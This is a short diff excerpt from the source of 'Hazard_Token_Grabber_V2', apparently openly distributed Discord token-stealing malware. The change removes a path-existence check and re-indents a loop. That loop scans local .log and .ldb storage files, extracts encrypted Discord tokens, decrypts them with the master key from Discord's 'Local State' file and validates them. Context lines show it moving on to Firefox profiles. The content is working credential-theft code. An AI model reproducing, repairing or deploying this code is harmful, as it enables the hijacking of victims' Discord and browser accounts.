@@ -281,15 +281,14 @@ class Hazard_Token_Grabber_V2(functions):
                             for token in findall(regex, line):
                                 asyncio.run(self.checkToken(token))
             else:
-                if os.path.exists(self.roaming + path.split("\\")[1].split("\\")[0]):
-                    for file_name in os.listdir(path):
-                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                            continue
-                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                            for y in findall(self.encrypted_regex, line):
-                                token = self.decrypt_val(b64decode(
-                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
-                                asyncio.run(self.checkToken(token))
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for y in findall(self.encrypted_regex, line):
+                            token = self.decrypt_val(b64decode(
+                                y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
+                            asyncio.run(self.checkToken(token))
 
         if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
